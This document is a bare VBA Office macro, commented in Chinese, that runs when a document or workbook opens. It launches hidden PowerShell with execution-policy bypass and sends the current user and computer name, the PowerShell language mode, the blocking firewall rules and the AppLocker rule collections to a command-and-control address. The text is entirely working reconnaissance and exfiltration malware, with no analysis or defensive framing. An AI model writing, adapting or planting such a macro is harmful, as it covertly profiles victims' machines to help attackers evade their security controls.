Sub Auto_Open()
    Dim C2 As String
    C2 = "http://192.168.1.18"
    
    ' 用户 + 语言模式
    Dim who As String
    who = "powershell -exec bypass -nop -c ""$c2='" & C2 & "'; $u=(whoami)+'@'+$env:COMPUTERNAME; iwr $c2/user/$u -useb; $m=$ExecutionContext.SessionState.LanguageMode; iwr $c2/psmode/$m -useb"""
    
    ' 防火墙阻止规则
    Dim fw As String
    fw = "powershell -exec bypass -nop -c ""$c2='" & C2 & "'; Get-NetFirewallRule -PolicyStore ActiveStore | where {$_.Action -eq 'Block'} | foreach {$n=$_.DisplayName -replace ' ','+'; iwr $c2/fwblock/$n -useb}"""
    
    ' AppLocker 策略
    Dim al As String
    al = "powershell -exec bypass -nop -c ""$c2='" & C2 & "'; Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections | foreach {$n=$_.Name -replace ' ','+'; iwr $c2/applocker/$n -useb}"""
    
    Shell who, vbHide
    Shell fw, vbHide
    Shell al, vbHide
End Sub

Sub AutoOpen()
    Auto_Open
End Sub

Sub Workbook_Open()
    Auto_Open
End Sub